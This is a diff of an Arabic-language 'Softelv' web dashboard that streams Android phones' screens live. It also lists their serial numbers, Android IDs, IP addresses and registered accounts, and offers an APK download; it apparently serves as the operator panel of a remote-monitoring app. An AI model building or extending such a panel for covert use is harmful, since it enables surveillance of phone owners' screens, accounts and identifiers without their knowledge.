@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة مراقبة Softelv</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <title>لوحة مراقبة الأجهزة المتقدمة — Softelv Executive</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-dark: #1a1a2e;
-            --bg-card: rgba(15, 52, 96, 0.4);
+            --bg-dark: #121220;
+            --bg-card: rgba(22, 27, 46, 0.85);
             --accent-blue: #0f3460;
             --highlight-red: #e94560;
             --text-main: #ffffff;
-            --text-muted: #a0a0b5;
-            --status-online: #4caf50;
-            --status-offline: #f44336;
-            --glass-border: rgba(255, 255, 255, 0.1);
+            --text-muted: #94a3b8;
+            --status-online: #10b981;
+            --status-offline: #ef4444;
+            --glass-border: rgba(255, 255, 255, 0.08);
         }
 
         * {
@@ -34,8 +34,8 @@
 
         /* Header */
         header {
-            background: rgba(15, 52, 96, 0.8);
-            backdrop-filter: blur(10px);
+            background: rgba(18, 18, 32, 0.95);
+            backdrop-filter: blur(12px);
             padding: 1rem 2rem;
             display: flex;
             justify-content: space-between;
@@ -47,10 +47,18 @@
         }
 
         .logo-area h1 {
-            font-size: 1.5rem;
-            font-weight: 700;
+            font-size: 1.4rem;
+            font-weight: 800;
             color: var(--highlight-red);
-            text-shadow: 0 0 10px rgba(233, 69, 96, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .logo-area span {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            font-weight: 400;
         }
 
         .connection-status {
@@ -67,14 +75,15 @@
             background-color: var(--status-offline);
             transition: background-color 0.3s ease;
         }
-        .status-dot.connected { background-color: var(--status-online); box-shadow: 0 0 8px var(--status-online); }
+        .status-dot.connected { background-color: var(--status-online); box-shadow: 0 0 10px var(--status-online); }
 
         /* Stats Bar */
         .stats-bar {
             display: flex;
             gap: 2rem;
-            padding: 1.5rem 2rem;
-            background: linear-gradient(to right, rgba(15, 52, 96, 0.3), transparent);
+            padding: 1.2rem 2rem;
+            background: linear-gradient(to right, rgba(233, 69, 96, 0.1), rgba(15, 52, 96, 0.2));
+            border-bottom: 1px solid var(--glass-border);
         }
 
         .stat-item {
@@ -83,20 +92,20 @@
         }
 
         .stat-value {
-            font-size: 1.8rem;
+            font-size: 1.6rem;
             font-weight: 700;
             color: var(--highlight-red);
         }
 
         .stat-label {
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             color: var(--text-muted);
         }
 
         /* Grid */
         .grid-container {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
             gap: 1.5rem;
             padding: 2rem;
         }
@@ -107,17 +116,18 @@
             border: 1px solid var(--glass-border);
             border-radius: 16px;
             padding: 1.5rem;
-            backdrop-filter: blur(5px);
+            backdrop-filter: blur(8px);
             transition: transform 0.3s ease, box-shadow 0.3s ease;
             display: flex;
             flex-direction: column;
             gap: 1rem;
-            animation: fadeIn 0.5s ease forwards;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
         }
 
         .device-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+            transform: translateY(-4px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+            border-color: rgba(233, 69, 96, 0.3);
         }
 
         .card-header {
@@ -127,80 +137,79 @@
         }
 
         .device-name {
-            font-size: 1.2rem;
-            font-weight: 600;
+            font-size: 1.25rem;
+            font-weight: 700;
         }
 
         .device-badges {
             display: flex;
-            gap: 0.5rem;
+            gap: 0.4rem;
             flex-wrap: wrap;
-            margin-top: 0.5rem;
+            margin-top: 0.4rem;
         }
 
         .badge {
-            background: rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.08);
             padding: 0.2rem 0.6rem;
-            border-radius: 20px;
+            border-radius: 8px;
             font-size: 0.75rem;
+            color: #e2e8f0;
         }
 
         .status-badge {
             display: flex;
             align-items: center;
             gap: 0.4rem;
-            font-size: 0.8rem;
+            font-size: 0.85rem;
+            font-weight: 600;
         }
 
-        .thumbnail-container {
-            width: 100%;
-            height: 180px;
-            background: #000;
-            border-radius: 8px;
-            overflow: hidden;
+        /* Details list in Card */
+        .card-details {
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 10px;
+            padding: 0.8rem 1rem;
+            font-size: 0.85rem;
             display: flex;
-            justify-content: center;
-            align-items: center;
-            border: 1px solid var(--glass-border);
+            flex-direction: column;
+            gap: 0.4rem;
         }
 
-        .thumbnail-container img {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
-        }
-        
-        .no-signal {
-            color: var(--text-muted);
-            font-size: 0.9rem;
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            color: #cbd5e1;
         }
 
-        .last-update {
-            font-size: 0.75rem;
+        .detail-label {
             color: var(--text-muted);
-            text-align: left;
+        }
+
+        .detail-value {
+            font-weight: 600;
+            color: #f1f5f9;
         }
 
         .btn-watch {
-            background: var(--highlight-red);
+            background: linear-gradient(135deg, var(--highlight-red), #d6334c);
             color: white;
             border: none;
-            padding: 0.8rem;
-            border-radius: 8px;
+            padding: 0.85rem;
+            border-radius: 10px;
             font-size: 1rem;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
-            transition: background 0.3s ease;
+            transition: all 0.3s ease;
             width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 0.5rem;
         }
 
         .btn-watch:hover {
-            background: #ff5c77;
-        }
-        
-        .btn-watch:disabled {
-            background: #555;
-            cursor: not-allowed;
+            box-shadow: 0 4px 15px rgba(233, 69, 96, 0.4);
+            transform: scale(1.01);
         }
 
         /* Modal */
@@ -210,8 +219,8 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            backdrop-filter: blur(5px);
+            background: rgba(10, 10, 20, 0.95);
+            backdrop-filter: blur(10px);
             z-index: 1000;
             display: flex;
             opacity: 0;
@@ -226,57 +235,139 @@
 
         .modal-content {
             width: 100%;
+            height: 100%;
             display: flex;
         }
 
         .live-screen-area {
             flex: 1;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             padding: 2rem;
+            position: relative;
         }
 
         #liveImage {
             max-width: 100%;
-            max-height: 90vh;
-            box-shadow: 0 0 30px rgba(0,0,0,0.5);
-            border-radius: 8px;
+            max-height: 85vh;
+            box-shadow: 0 0 40px rgba(0,0,0,0.8);
+            border-radius: 12px;
+            border: 2px solid var(--glass-border);
+            object-fit: contain;
         }
 
-        .sidebar {
-            width: 300px;
-            background: var(--bg-dark);
-            border-right: 1px solid var(--glass-border);
-            padding: 2rem;
+        .screen-placeholder {
             display: flex;
             flex-direction: column;
-            gap: 1.5rem;
+            align-items: center;
+            gap: 1rem;
+            color: var(--text-muted);
+            font-size: 1.1rem;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid var(--highlight-red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Sidebar in Modal */
+        .sidebar {
+            width: 420px;
+            background: #181829;
+            border-right: 1px solid var(--glass-border);
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1.2rem;
+            overflow-y: auto;
+            max-height: 100vh;
+        }
+
+        .sidebar-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--highlight-red);
+            padding-bottom: 0.8rem;
         }
 
         .close-btn {
-            align-self: flex-end;
             background: none;
             border: none;
             color: white;
             font-size: 2rem;
             cursor: pointer;
+            line-height: 1;
         }
 
-        .info-item {
-            border-bottom: 1px solid var(--glass-border);
-            padding-bottom: 1rem;
+        .info-section {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            padding: 1rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.6rem;
         }
 
-        .fps-counter {
-            font-size: 1.2rem;
-            color: #4caf50;
-            font-weight: bold;
+        .section-title {
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: #38bdf8;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            padding-bottom: 0.4rem;
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.85rem;
+            color: #cbd5e1;
+        }
+
+        .info-row span:first-child {
+            color: var(--text-muted);
+        }
+
+        .highlight-val {
+            color: #fbbf24;
+            font-weight: 700;
+            word-break: break-all;
+        }
+
+        .fps-badge {
+            display: inline-block;
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--status-online);
+            padding: 0.2rem 0.6rem;
+            border-radius: 6px;
+            font-weight: 700;
+        }
+
+        .accounts-list {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 0.5rem;
+            font-size: 0.8rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.3rem;
+            max-height: 120px;
+            overflow-y: auto;
         }
     </style>
 </head>
@@ -284,10 +375,10 @@
 
     <header>
         <div class="logo-area">
-            <h1>لوحة مراقبة Softelv</h1>
+            <h1>لوحة المراقبة وإدارة الأجهزة <span>| Softelv Executive</span></h1>
         </div>
         <div style="display: flex; align-items: center; gap: 1.5rem;">
-            <a href="/download/SoftelvMonitor.apk" download style="background: var(--highlight-red); color: white; text-decoration: none; padding: 0.4rem 1rem; border-radius: 8px; font-weight: 600; font-size: 0.85rem; transition: transform 0.2s ease;">📥 تحميل تطبيق الأندرويد (APK)</a>
+            <a href="/download/SoftelvMonitor.apk" download style="background: var(--highlight-red); color: white; text-decoration: none; padding: 0.4rem 1rem; border-radius: 8px; font-weight: 700; font-size: 0.85rem; transition: transform 0.2s ease;">📥 تحميل ملف التطبيق (APK)</a>
             <div class="connection-status">
                 <span id="wsStatusText">جاري الاتصال...</span>
                 <div id="wsStatusDot" class="status-dot"></div>
@@ -298,46 +389,139 @@
     <div class="stats-bar">
         <div class="stat-item">
             <span class="stat-value" id="statTotal">0</span>
-            <span class="stat-label">إجمالي الأجهزة</span>
+            <span class="stat-label">إجمالي الأجهزة المسجلة</span>
         </div>
         <div class="stat-item">
             <span class="stat-value" style="color: var(--status-online)" id="statOnline">0</span>
-            <span class="stat-label">متصلة</span>
+            <span class="stat-label">أجهزة متصلة الآن</span>
         </div>
         <div class="stat-item">
             <span class="stat-value" style="color: var(--status-offline)" id="statOffline">0</span>
-            <span class="stat-label">غير متصلة</span>
+            <span class="stat-label">أجهزة غير متصلة</span>
         </div>
     </div>
 
     <div class="grid-container" id="deviceGrid">
-        <!-- Cards will be dynamically inserted here -->
+        <!-- Devices will be rendered here -->
     </div>
 
-    <!-- Live View Modal -->
+    <!-- Live View Modal with Full Executive Device Details -->
     <div class="modal-overlay" id="liveModal">
         <div class="modal-content">
             <div class="sidebar">
-                <button class="close-btn" onclick="closeLiveView()">&times;</button>
-                <h2 id="modalDeviceName">اسم الجهاز</h2>
-                
-                <div class="info-item">
-                    <div class="stat-label">نظام التشغيل</div>
-                    <div id="modalOs" style="font-size: 1.1rem; margin-top: 0.3rem;">Android</div>
+                <div class="sidebar-header">
+                    <div>
+                        <h2 id="modalDeviceName">اسم الجهاز</h2>
+                        <span id="modalSubInfo" style="font-size: 0.8rem; color: var(--text-muted);">-</span>
+                    </div>
+                    <button class="close-btn" onclick="closeLiveView()">&times;</button>
                 </div>
-                
-                <div class="info-item">
-                    <div class="stat-label">دقة الشاشة</div>
-                    <div id="modalRes" style="font-size: 1.1rem; margin-top: 0.3rem;">1080x1920</div>
+
+                <!-- Live Stream Performance -->
+                <div class="info-section">
+                    <div class="section-title">⚡ أداء البث المباشر للشاشة</div>
+                    <div class="info-row">
+                        <span>معدل الإطارات الفعلي:</span>
+                        <span class="fps-badge"><span id="modalFps">0</span> FPS</span>
+                    </div>
+                    <div class="info-row">
+                        <span>دقة الشاشة:</span>
+                        <span id="modalRes">-</span>
+                    </div>
                 </div>
-                
-                <div class="info-item">
-                    <div class="stat-label">معدل الإطارات (FPS)</div>
-                    <div id="modalFps" class="fps-counter">0</div>
+
+                <!-- Serials & Identifiers -->
+                <div class="info-section">
+                    <div class="section-title">🔑 السيريال ومعرفات الجهاز</div>
+                    <div class="info-row">
+                        <span>السيريال (Serial):</span>
+                        <span id="modalSerial" class="highlight-val">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span>معرف الأندرويد (Android ID):</span>
+                        <span id="modalAndroidId" class="highlight-val">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span>الشركة والماركة:</span>
+                        <span id="modalBrand">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span>رقم البناء (Build ID):</span>
+                        <span id="modalBuildId">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span>اللوحة الأم (Board):</span>
+                        <span id="modalBoard">-</span>
+                    </div>
+                </div>
+
+                <!-- OS & Security -->
+                <div class="info-section">
+                    <div class="section-title">🛡️ النظام والأمان</div>
+                    <div class="info-row">
+                        <span>إصدار أندرويد:</span>
+                        <span id="modalOs" style="color:#38bdf8; font-weight:700;">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span>مستوى API:</span>
+                        <span id="modalSdk">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span>التحديث الأمني:</span>
+                        <span id="modalSecurityPatch">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span>إصدار النواة (Kernel):</span>
+                        <span id="modalKernel">-</span>
+                    </div>
+                </div>
+
+                <!-- Hardware & Battery -->
+                <div class="info-section">
+                    <div class="section-title">🔋 العتاد والذاكرة والبطارية</div>
+                    <div class="info-row">
+                        <span>البطارية:</span>
+                        <span id="modalBattery" style="font-weight:700;">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span>الذاكرة العشوائية (RAM):</span>
+                        <span id="modalRam">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span>سعة التخزين (Storage):</span>
+                        <span id="modalStorage">-</span>
+                    </div>
+                </div>
+
+                <!-- Network -->
+                <div class="info-section">
+                    <div class="section-title">🌐 الشبكة والاتصال</div>
+                    <div class="info-row">
+                        <span>عنوان IP:</span>
+                        <span id="modalIp" class="highlight-val">-</span>
+                    </div>
+                    <div class="info-row">
+                        <span>نوع الاتصال:</span>
+                        <span id="modalNetwork">-</span>
+                    </div>
+                </div>
+
+                <!-- Registered Accounts -->
+                <div class="info-section">
+                    <div class="section-title">👤 الحسابات المسجلة على الجهاز</div>
+                    <div class="accounts-list" id="modalAccountsList">
+                        <span>جاري التحميل...</span>
+                    </div>
                 </div>
             </div>
+
+            <!-- Screen Area -->
             <div class="live-screen-area">
-                <img id="liveImage" src="" alt="Live Stream">
+                <div id="streamPlaceholder" class="screen-placeholder">
+                    <div class="spinner"></div>
+                    <span>جاري استقبال بث الشاشة المباشر من الهاتف...</span>
+                </div>
+                <img id="liveImage" src="" alt="بث الشاشة المباشر" style="display: none;">
             </div>
         </div>
     </div>
@@ -348,7 +532,6 @@
         let currentWatchedId = null;
         let reconnectDelay = 1000;
         
-        // FPS Calculation
         let frameCount = 0;
         let lastFpsTime = Date.now();
         
@@ -360,18 +543,17 @@
             ws.binaryType = "blob";
             
             ws.onopen = () => {
-                document.getElementById('wsStatusText').textContent = 'متصل';
+                document.getElementById('wsStatusText').textContent = 'متصل بالسيرفر';
                 document.getElementById('wsStatusDot').classList.add('connected');
                 reconnectDelay = 1000;
                 
-                // Re-subscribe if we were watching something
                 if (currentWatchedId) {
                     ws.send(JSON.stringify({ type: 'watch', deviceId: currentWatchedId }));
                 }
             };
             
             ws.onclose = () => {
-                document.getElementById('wsStatusText').textContent = 'مفصول (جاري إعادة الاتصال...)';
+                document.getElementById('wsStatusText').textContent = 'مفصول (إعادة الاتصال...)';
                 document.getElementById('wsStatusDot').classList.remove('connected');
                 setTimeout(connectWebSocket, Math.min(reconnectDelay *= 1.5, 10000));
             };
@@ -383,12 +565,15 @@
                         if (msg.type === 'device_list') {
                             devices = msg.devices;
                             renderDashboard();
+                            if (currentWatchedId) {
+                                const d = devices.find(x => x.id === currentWatchedId);
+                                if (d) populateModalDetails(d);
+                            }
                         }
                     } catch (e) {
-                        console.error('Error parsing JSON:', e);
+                        console.error('JSON Error:', e);
                     }
                 } else if (event.data instanceof Blob) {
-                    // Binary frame received
                     if (currentWatchedId) {
                         updateLiveFrame(event.data);
                     }
@@ -408,32 +593,52 @@
                 else offline++;
                 
                 const isOnline = device.status === 'online';
-                const timeAgo = device.lastFrameTime ? formatTimeAgo(device.lastFrameTime) : 'لا يوجد بيانات';
+                const timeAgo = device.lastFrameTime ? formatTimeAgo(device.lastFrameTime) : 'بانتظار البث';
                 
                 const card = document.createElement('div');
                 card.className = 'device-card';
                 card.innerHTML = `
                     <div class="card-header">
                         <div>
-                            <div class="device-name">${escapeHtml(device.model)}</div>
+                            <div class="device-name">${escapeHtml(device.model || 'جهاز أندرويد')}</div>
                             <div class="device-badges">
-                                <span class="badge">${escapeHtml(device.manufacturer)}</span>
-                                <span class="badge">Android ${escapeHtml(device.osVersion)}</span>
-                                <span class="badge">${device.screenWidth}x${device.screenHeight}</span>
+                                <span class="badge">${escapeHtml(device.brand || device.manufacturer || 'Android')}</span>
+                                <span class="badge">Android ${escapeHtml(device.osVersion || '')}</span>
+                                <span class="badge">${device.screenWidth || 0}x${device.screenHeight || 0}</span>
                             </div>
                         </div>
                         <div class="status-badge" style="color: ${isOnline ? 'var(--status-online)' : 'var(--status-offline)'}">
-                            <div class="status-dot ${isOnline ? 'connected' : ''}" style="background-color: ${isOnline ? 'var(--status-online)' : 'var(--status-offline)'}; box-shadow: none;"></div>
+                            <div class="status-dot ${isOnline ? 'connected' : ''}" style="background-color: ${isOnline ? 'var(--status-online)' : 'var(--status-offline)'};"></div>
                             ${isOnline ? 'متصل' : 'غير متصل'}
                         </div>
                     </div>
-                    <div class="thumbnail-container">
-                        <div class="no-signal">${isOnline ? 'جاهز للعرض' : 'لا توجد إشارة'}</div>
+
+                    <div class="card-details">
+                        <div class="detail-row">
+                            <span class="detail-label">السيريال / المعرف:</span>
+                            <span class="detail-value highlight-val">${escapeHtml(device.serial || device.androidId || device.deviceId || '-')}</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">البطارية:</span>
+                            <span class="detail-value">${device.batteryPercent ? device.batteryPercent + '%' + (device.isCharging ? ' ⚡' : '') : 'N/A'}</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">الذاكرة (RAM):</span>
+                            <span class="detail-value">${escapeHtml(device.freeRam || '-')} متاح / ${escapeHtml(device.totalRam || '-')}</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">عنوان IP:</span>
+                            <span class="detail-value">${escapeHtml(device.ipAddress || 'Unknown')}</span>
+                        </div>
                     </div>
+
                     <div style="display: flex; justify-content: space-between; align-items: center; margin-top: auto;">
-                        <div class="last-update">آخر تحديث: ${timeAgo}</div>
+                        <span style="font-size: 0.75rem; color: var(--text-muted);">آخر إطار: ${timeAgo}</span>
                     </div>
-                    <button class="btn-watch" onclick="openLiveView('${device.id}')" ${!isOnline ? 'disabled' : ''}>مشاهدة مباشرة</button>
+
+                    <button class="btn-watch" onclick="openLiveView('${device.id}')" ${!isOnline ? 'disabled' : ''}>
+                        <span>📺 عرض شاشة الجهاز والتفاصيل</span>
+                    </button>
                 `;
                 grid.appendChild(card);
             });
@@ -448,10 +653,12 @@
             if (!device) return;
             
             currentWatchedId = deviceId;
+            populateModalDetails(device);
             
-            document.getElementById('modalDeviceName').textContent = device.model;
-            document.getElementById('modalOs').textContent = 'Android ' + device.osVersion;
-            document.getElementById('modalRes').textContent = device.screenWidth + 'x' + device.screenHeight;
+            // Reset screen view
+            document.getElementById('streamPlaceholder').style.display = 'flex';
+            document.getElementById('liveImage').style.display = 'none';
+            document.getElementById('liveImage').src = '';
             
             document.getElementById('liveModal').classList.add('active');
             
@@ -461,6 +668,50 @@
             
             frameCount = 0;
             lastFpsTime = Date.now();
+        }
+
+        function populateModalDetails(device) {
+            document.getElementById('modalDeviceName').textContent = device.model || 'جهاز غير معروف';
+            document.getElementById('modalSubInfo').textContent = `${device.manufacturer || ''} ${device.brand || ''}`;
+            document.getElementById('modalRes').textContent = `${device.screenWidth || 0} x ${device.screenHeight || 0}`;
+            
+            // Serials
+            document.getElementById('modalSerial').textContent = device.serial || 'N/A';
+            document.getElementById('modalAndroidId').textContent = device.androidId || device.deviceId || 'N/A';
+            document.getElementById('modalBrand').textContent = `${device.manufacturer || ''} / ${device.brand || ''}`;
+            document.getElementById('modalBuildId').textContent = device.buildId || 'N/A';
+            document.getElementById('modalBoard').textContent = device.board || 'N/A';
+            
+            // OS
+            document.getElementById('modalOs').textContent = `Android ${device.osVersion || ''}`;
+            document.getElementById('modalSdk').textContent = `API Level ${device.sdkVersion || 'N/A'}`;
+            document.getElementById('modalSecurityPatch').textContent = device.securityPatch || 'N/A';
+            document.getElementById('modalKernel').textContent = device.kernelVersion || 'N/A';
+            
+            // Hardware
+            document.getElementById('modalBattery').textContent = device.batteryPercent ? 
+                `${device.batteryPercent}% ${device.isCharging ? '(جاري الشحن ⚡)' : '(على البطارية)'}` : 'N/A';
+            document.getElementById('modalRam').textContent = device.totalRam ? 
+                `متاح ${device.freeRam} من إجمالي ${device.totalRam}` : 'N/A';
+            document.getElementById('modalStorage').textContent = device.totalStorage ? 
+                `فارغ ${device.freeStorage} من إجمالي ${device.totalStorage}` : 'N/A';
+                
+            // Network
+            document.getElementById('modalIp').textContent = device.ipAddress || 'Unknown';
+            document.getElementById('modalNetwork').textContent = device.networkType || 'Unknown';
+            
+            // Accounts
+            const accountsContainer = document.getElementById('modalAccountsList');
+            accountsContainer.innerHTML = '';
+            if (device.accounts && device.accounts.length > 0) {
+                device.accounts.forEach(acc => {
+                    const row = document.createElement('div');
+                    row.textContent = '• ' + acc;
+                    accountsContainer.appendChild(row);
+                });
+            } else {
+                accountsContainer.innerHTML = '<span>لا توجد حسابات عامة مسجلة</span>';
+            }
         }
 
         function closeLiveView() {
@@ -475,15 +726,19 @@
         function updateLiveFrame(blob) {
             const url = URL.createObjectURL(blob);
             const img = document.getElementById('liveImage');
+            const placeholder = document.getElementById('streamPlaceholder');
             
-            // Revoke old URL to prevent memory leaks
             if (img.src && img.src.startsWith('blob:')) {
                 URL.revokeObjectURL(img.src);
             }
             
+            img.onload = () => {
+                placeholder.style.display = 'none';
+                img.style.display = 'block';
+            };
+            
             img.src = url;
             
-            // Calculate FPS
             frameCount++;
             const now = Date.now();
             if (now - lastFpsTime >= 1000) {
@@ -511,11 +766,8 @@
                  .replace(/'/g, "&#039;");
         }
 
-        // Initial connection
         connectWebSocket();
-        
-        // Refresh time displays every minute
-        setInterval(renderDashboard, 60000);
+        setInterval(renderDashboard, 30000);
     </script>
 </body>
 </html>
